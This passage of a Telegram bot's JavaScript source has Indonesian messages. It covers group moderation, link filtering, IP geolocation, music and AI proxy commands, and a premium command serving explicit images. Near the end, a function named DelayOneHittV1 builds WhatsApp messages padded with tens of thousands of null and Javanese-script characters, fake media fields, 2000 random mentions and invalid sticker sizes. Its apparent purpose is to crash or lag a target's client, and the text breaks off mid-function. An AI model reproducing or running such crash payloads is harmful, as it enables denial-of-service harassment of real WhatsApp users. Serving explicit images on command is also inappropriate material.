╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 🔇 DI-MUTE
╰────────────
🤐 <i>User tidak bisa kirim pesan sekarang</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal mute: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🔊 UNMUTE
 * ========================================================= */
bot.command("unmute", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-unmute");

  try {
    await ctx.restrictChatMember(target.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    return ctx.reply(
      `<blockquote>🔊 𝐔𝐍𝐌𝐔𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 🔊 AKTIF LAGI
╰────────────
💬 <i>User sudah bisa kirim pesan lagi</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unmute: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🔒 LOCK GC
 * ========================================================= */
bot.command("lockgc", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");
  if (!(await botIsAdmin(ctx))) return ctx.reply("❌ ☇ Bot harus jadi admin dulu");

  try {
    await ctx.setChatPermissions({
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_other_messages: false,
    });
    return ctx.reply(
      `<blockquote>🔒 𝐆𝐑𝐔𝐏 𝐃𝐈𝐊𝐔𝐍𝐂𝐈 🔒</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ Status : 🔐 LOCKED
│ ⌬ Akses  : 👮‍♂️ Admin Only
│ ⌬ Pesan  : 🚫 Disabled
╰────────────
🚫 <i>Hanya admin yang bisa kirim pesan sekarang</i> 👑`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal lock: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🔓 UNLOCK GC
 * ========================================================= */
bot.command("unlockgc", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");
  if (!(await botIsAdmin(ctx))) return ctx.reply("❌ ☇ Bot harus jadi admin dulu");

  try {
    await ctx.setChatPermissions({
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      can_invite_users: true,
    });
    return ctx.reply(
      `<blockquote>🔓 𝐆𝐑𝐔𝐏 𝐃𝐈𝐁𝐔𝐊𝐀 🎉</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ Status : 🔓 UNLOCKED
│ ⌬ Akses  : 👥 Semua Member
│ ⌬ Pesan  : 💬 Enabled
╰────────────
💚 <i>Semua member sudah bisa ngobrol lagi</i> 🗣️`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unlock: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  👢 KICK
 * ========================================================= */
bot.command("kick", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-kick");

  try {
    await ctx.kickChatMember(target.id);
    return ctx.reply(
      `<blockquote>👢 𝐔𝐒𝐄𝐑 𝐃𝐈-𝐊𝐈𝐂𝐊</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 👋 KICKED
╰────────────
🚪 <i>User telah dikeluarkan dari grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal kick: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🚫 BAN
 * ========================================================= */
bot.command("ban", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-ban");

  try {
    await ctx.banChatMember(target.id);
    return ctx.reply(
      `<blockquote>🚫 𝐔𝐒𝐄𝐑 𝐃𝐈-𝐁𝐀𝐍 ⛔</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 🚫 BANNED
╰────────────
🔨 <i>User diblokir permanen dari grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal ban: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  ✅ UNBAN
 * ========================================================= */
bot.command("unban", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-unban");

  try {
    await ctx.unbanChatMember(target.id);
    return ctx.reply(
      `<blockquote>✅ 𝐔𝐒𝐄𝐑 𝐃𝐈-𝐔𝐍𝐁𝐀𝐍 🔓</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: ✅ UNBANNED
╰────────────
🎉 <i>User bisa join grup lagi</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unban: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  ⬆️ PROMOTE
 * ========================================================= */
bot.command("promote", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-promote");

  try {
    await ctx.promoteChatMember(target.id, {
      can_change_info: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true,
      can_pin_messages: true,
    });
    return ctx.reply(
      `<blockquote>⬆️ 𝐏𝐑𝐎𝐌𝐎𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 👑</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 👑 ADMIN
╰────────────
🎊 <i>Selamat! User sekarang jadi admin</i> 🎉`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal promote: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  ⬇️ DEMOTE
 * ========================================================= */
bot.command("demote", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-demote");

  try {
    await ctx.promoteChatMember(target.id, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
    });
    return ctx.reply(
      `<blockquote>⬇️ 𝐃𝐄𝐌𝐎𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 👥 MEMBER
╰────────────
😔 <i>User dicabut dari admin</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal demote: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  📢 TAGALL
 * ========================================================= */
bot.command("tagall", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  try {
    const admins = await ctx.getChatAdministrators();
    const list = admins
      .map((a, i) => `${i + 1}. 👤 <a href="tg://user?id=${a.user.id}">${a.user.first_name}</a>`)
      .join('\n');

    return ctx.reply(
      `<blockquote>📢 𝐓𝐀𝐆 𝐀𝐋𝐋 🔔</blockquote>
${list}

💬 <i>Perhatian untuk semua member!</i> 🎯`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal tagall: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🤫 HIDETAG
 * ========================================================= */
bot.command("hidetag", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  try {
    const admins = await ctx.getChatAdministrators();
    const mentions = admins.map((a) => `<a href="tg://user?id=${a.user.id}">\u2063</a>`).join('');
    const pesan = (ctx.match || '').trim() || '📢 Perhatian semua! 👀';
    return ctx.reply(`🤫 ${pesan} ${mentions}`, { parse_mode: "HTML" });
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal hidetag: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  📌 PIN / UNPIN / DEL
 * ========================================================= */
bot.command("pin", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("⚠️ ☇ Reply pesan yang mau di-pin");

  try {
    await ctx.pinChatMessage(reply.message_id);
    return ctx.reply(
      `<blockquote>📌 𝐏𝐄𝐒𝐀𝐍 𝐃𝐈-𝐏𝐈𝐍 ✅</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒ 〕
│ ⌬ Msg ID : <code>${reply.message_id}</code>
│ ⌬ Status : PINNED
╰────────────
🔝 <i>Pesan tampil di atas grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal pin: ${e.description || e.message}`);
  }
});

bot.command("unpin", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  try {
    await ctx.unpinChatMessage();
    return ctx.reply(
      `<blockquote>📌 𝐏𝐄𝐒𝐀𝐍 𝐃𝐈-𝐔𝐍𝐏𝐈𝐍 ❌</blockquote>
🔽 <i>Pin pesan sudah dilepas dari atas grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unpin: ${e.description || e.message}`);
  }
});

bot.command("del", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("⚠️ ☇ Reply pesan yang mau dihapus");

  try {
    await ctx.deleteMessage(reply.message_id);
    await ctx.deleteMessage().catch(() => {});
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal hapus: ${e.description || e.message}`);
  }
});

bot.command("settings", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");

  const s = getGroupSetting(ctx.chat.id);
  return ctx.reply(
    `<blockquote>⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐆𝐑𝐔𝐏 🔧</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ 🔗 Anti-Link  : ${s.antilink ? '✅ ON' : '❌ OFF'}
│ ⌬ 🚫 Anti-Spam  : ${s.antispam ? '✅ ON' : '❌ OFF'}
│ ⌬ 👋 Welcome    : ${s.welcome ? '✅ ON' : '❌ OFF'}
│ ⌬ ⚠️ Anti-Toxic  : ${s.antitoxic ? '✅ ON' : '❌ OFF'}
╰────────────
💡 <i>Ubah setting dengan command masing-masing</i> 🔧`,
    { parse_mode: "HTML" }
  );
});

bot.on("message", async (ctx, next) => {
  try {
    if (ctx.chat.type === 'private') return next();
    const s = getGroupSetting(ctx.chat.id);
    if (!s.antilink) return next();

    const text = ctx.message.text || ctx.message.caption || '';
    const linkRegex = /(https?:\/\/|t\.me\/|wa\.me\/|telegram\.me\/)/i;

    if (linkRegex.test(text)) {
      if (await isAdmin(ctx)) return next();
      try {
        await ctx.deleteMessage();
        await ctx.reply(
          `🚫🔗 <b>LINK TERDETEKSI!</b> 🔗🚫\n\n👤 <b>User :</b> ${ctx.from.first_name}\n⚠️ <i>Link tidak diizinkan di grup ini!</i>\n🗑️ <i>Pesan otomatis dihapus</i>`,
          { parse_mode: "HTML" }
        );
      } catch {}
    }
  } catch (e) {}
  return next();
});

bot.command("shortlink", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!url) {
    return ctx.reply(
      "🔗 Send the link you want to shorten!\n\nExample:\n`/shortlink https://example.com/very/long/link`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const res = await fetch(
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
    );
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Shorten failed");
    }

    await ctx.reply(
      `✅ *Link shortened!*\n\n🔹 Original: ${url}\n🔹 Short: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Shortlink error:", err);
    ctx.reply("⚠️ Failed to shorten link. Try again later.");
  }
});

bot.command("trackip", async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.command("reactch", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ").slice(1).join("");
    const [emoji, ch] = text.split(",");

    if (!emoji || !ch) {
      return ctx.reply("❌ Contoh: /reactch 🌸,@channel");
    }

    const chat = await ctx.telegram.getChat(ch.trim());
    const chId = chat.id;

    const msgId = lastChannelPost[chId];
    if (!msgId) {
      return ctx.reply("❌ Kirim 1 post baru di channel dulu");
    }

    await ctx.telegram.setMessageReaction(
      chId,
      msgId,
      [{ type: "emoji", emoji: emoji.trim() }]
    );

    ctx.reply("✅ React berhasil");

  } catch (err) {
    console.log("ERROR:", err);
    ctx.reply("❌ Gagal (cek bot join channel)");
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]


bot.command("ai", async (ctx) => {
  const userId = ctx.from.id
  const query = ctx.message.text.split(" ").slice(1).join(" ")

  if (!query) {
    return ctx.reply("Contoh penggunaan:\n/ai siapa presiden indonesia")
  }

  const now = Date.now()

  // cooldown 5 detik
  if (cooldown[userId] && now - cooldown[userId] < 5000) {
    return ctx.reply("Tunggu 5 detik sebelum pakai lagi")
  }

  // cek request sebelumnya
  if (processing[userId]) {
    return ctx.reply("Tunggu, request sebelumnya masih diproses")
  }

  cooldown[userId] = now
  processing[userId] = true

  try {
    await ctx.reply("Sabar Biar Gwa Mikir Dulu...")

    let hasil = await aiPerplexity(query)

    if (hasil.length > 4000) {
      hasil = hasil.slice(0, 4000) + "..."
    }

    await ctx.reply(hasil)

  } catch (err) {
    await ctx.reply("Terjadi error: " + err.message)
  } finally {
    processing[userId] = false
  }
})

// CASE REQ FITUR + SPOTIFY + AI
const memeks = [
  "spotify",
  "ytmusic",
  "joox",
  "soundcloud",
  "deezer",
  "applemusic",
  "amazonmusic",
  "kiw",
  "audiomack",
  "resso",
  "play",
  "ytplay",
  "ytmp3",
  "song",
  "music"
]

// ambil command regex
const kwontol = new RegExp(`^\\/(${memeks.join("|")})\\s+(.+)`, "i")

async function fetchAPI(query) {
  try {
    const url = `http://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`

    const res = await axios.get(url, {
      timeout: 15000,
      validateStatus: () => true
    })

    if (res.status !== 200 || !res.data?.status) {
      return null
    }

    return res.data.result

  } catch (err) {
    console.log("API ERROR:", err.message)
    return null
  }
}

async function sendAudioSafe(ctx, data) {
  try {
    return await ctx.replyWithAudio(
      { url: data.download },
      {
        title: data.title || "Unknown",
        performer: data.artist || "Unknown",
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}
⏱ ${data.duration || "Unknown"}`
      }
    )

  } catch (err) {

    return await ctx.replyWithDocument(
      { url: data.download },
      {
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}`
      }
    )
  }
}

// handler command
bot.hears(kwontol, async (ctx) => {
  try {
    const text = ctx.message.text
    const match = text.match(kwontol)

    if (!match) return

    const cmd = match[1]
    const query = match[2]

    await ctx.sendChatAction("upload_document")

    const data = await fetchAPI(query)

    if (!data || !data.download) {
      return ctx.reply(`❌ (${cmd}) Lagu tidak ditemukan`)
    }

    await sendAudioSafe(ctx, data)

  } catch (err) {
    console.log("ERROR:", err.message)
    ctx.reply("❌ Gagal kirim audio")
  }
})

// anti crash
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED:", err)
})

process.on("uncaughtException", (err) => {
  console.log("CRASH:", err)
})

const processing = {}

async function aiPerplexity(query) {
  try {
    const url = "http://api.ikyyxd.my.id/ai/perplexity?query=" + encodeURIComponent(query)
    
    const res = await axios.get(url)

    return res.data.result || JSON.stringify(res.data)
  } catch (err) {
    return "Terjadi error: " + err.message
  }
}


//NAROH FUNCTION
async function DelayOneHittV1(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
